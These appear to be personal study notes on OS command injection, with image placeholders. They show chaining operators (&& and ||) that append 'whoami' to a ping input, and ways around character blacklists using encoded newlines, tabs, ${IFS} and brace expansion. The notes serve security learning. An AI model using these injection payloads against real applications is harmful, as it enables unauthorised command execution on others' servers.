![[Pasted image 20250415174021.png]]
![[Pasted image 20250415174756.png]]

**AND (&&) Operator** - `ping -c 1 127.0.0.1 && whoami` : This will execute both the commands.
**OR (||) Operator** - `ping -c 1 127.0.0.1 || whoami` : This runs second command only if the first commands fail to execute
![[Pasted image 20250416101227.png]]

**Check for Blacklisted Characters :**  A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. 

## Bypassing Blacklisted Characters
- Spaces - `127.0.0.1%0a whoami
- Use Tabs - `127.0.0.1%0a%09`
- Use IFS - `127.0.0.1%0a${IFS}`
- Using Brace Expansions - `127.0.0.1%0a{ls,-la}`
- 